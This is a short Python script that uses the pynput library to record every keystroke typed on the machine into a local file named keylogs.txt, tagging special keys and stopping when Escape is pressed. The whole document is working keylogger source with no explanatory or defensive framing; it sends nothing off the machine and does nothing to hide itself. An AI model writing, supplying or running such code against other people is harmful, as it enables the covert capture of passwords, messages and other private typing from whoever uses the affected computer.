from pynput.keyboard import Listener, Key

# Function to write keystrokes to a file
def write_to_file(content):
    with open("keylogs.txt", "a") as log_file:
        log_file.write(content)

# Function to handle key press events
def on_press(key):
    try:
        write_to_file(key.char)
    except AttributeError:
        if key == Key.space:
            write_to_file(' ')
        elif key == Key.enter:
            write_to_file('\n')
        elif key == Key.backspace:
            write_to_file('[BACKSPACE]')
        elif key == Key.tab:
            write_to_file('\t')
        elif key == Key.esc:
            write_to_file('[ESC]')
        else:
            write_to_file(f'[{key.name}]')

# Function to handle key release events
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Main function to set up the listener
def main():
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        write_to_file(f"\nException: {str(e)}\n")

if __name__ == "__main__":
    main()
